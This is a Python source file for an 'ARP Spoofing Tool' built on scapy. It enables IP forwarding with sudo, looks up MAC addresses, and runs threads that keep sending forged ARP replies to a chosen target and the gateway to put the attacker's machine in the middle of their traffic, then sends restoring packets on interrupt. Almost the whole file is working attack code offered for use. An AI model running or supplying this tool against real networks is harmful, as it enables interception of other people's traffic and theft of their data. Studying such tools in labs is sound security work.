from scapy.all import Ether, ARP, srp, send
import time
import threading
import os
import banner

def print_success_text(text):
    print(f"\033[92m{text}\033[0m\n")

def print_error_text(text):
    print(f"\033[91m[-]{text}\033[0m\n")

def print_info_text(text):
    print(f"\033[93m{text}\033[0m\n")

def enable_iproute():
    #this one is for mac users
    text = "[!]IP routing check"
    print_info_text(text)

    result = os.system("sysctl -n net.inet.ip.forwarding")
    if result == 1:
        text = "[!]IP route already enabled"
        print_info_text(text)
    else:
        os.system("sudo sysctl -w net.inet.ip.forwarding=1")
        text = "[+]IP routing complete"
        print_success_text(text)
       
    #this one is for linux users    
    '''
    def enable_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    text = "[!]IP routing check"
    print_info_text(text)

    with open(file_path, "r+") as f:
        if f.read().strip() == "1":
            text = "[!]IP route already enabled"
            print_info_text(text)
        else:
            f.seek(0)
            f.write("1")
            f.truncate()
            text = "[+]IP routing complete"
            print_success_text(text)
    '''

def get_mac(target_ip):
    request_pck = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
    recv, unrecv = srp(request_pck, timeout=3, verbose=0) 
    
    if recv:
        target_hw = recv[0][1].hwsrc
        return target_hw
    else:
        text = "[-]Unable to find target mac address"
        print_error_text(text)
        return False

def arp_spoof(target_ip, spoofed_ip, stop_event):
    target_mac = get_mac(target_ip)
    if target_mac is False:
        return False
    
    arp_packet = ARP(hwdst=target_mac, psrc=spoofed_ip, pdst=target_ip, op=2)
    text = "[!]Sending spoofed arp packet to target..."
    print_info_text(text)
    try:
        while not stop_event.is_set():
            send(arp_packet, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        pass

def recover_arp(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoofed_ip)
    if target_mac is False or spoof_mac is False:
        return False

    arp_packet = ARP(hwdst=target_mac, hwsrc=spoof_mac, psrc=spoofed_ip, pdst=target_ip, op=2)
    text = "[!]Sending recovery arp packet to target..."
    print_info_text(text)
    send(arp_packet, verbose=False)
    time.sleep(1)
    text = "[+]ARP packet sent to target"
    print_success_text(text)

def main():
    banner.print_banner("ARP Spoofing Tool")
    print_info_text("[!]Process starting...")
    time.sleep(1)
    
    gateway_ip = input("Please enter gateway IP address: ")
    target_ip = input("Please enter target IP address: ")

    print_info_text("[!]Now performing arp spoofing...")

    enable_iproute()
    
    stop_event = threading.Event()
    
    spoof_target_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip, stop_event))
    spoof_gateway_thread = threading.Thread(target=arp_spoof, args=(gateway_ip, target_ip, stop_event))
    spoof_target_thread.start()
    spoof_gateway_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print_info_text("[!]Keyboard interrupt received, stopping ARP spoofing...")
        stop_event.set()
        spoof_target_thread.join()
        spoof_gateway_thread.join()
        
        # ARP 테이블 복구
        print_info_text("[!]Recovering ARP Table...")
        recover_arp(target_ip, gateway_ip)
        recover_arp(gateway_ip, target_ip)
        
        print_success_text("[+]Recovery Complete. Shutting down the process :)")
    
if __name__ == "__main__":
    main()
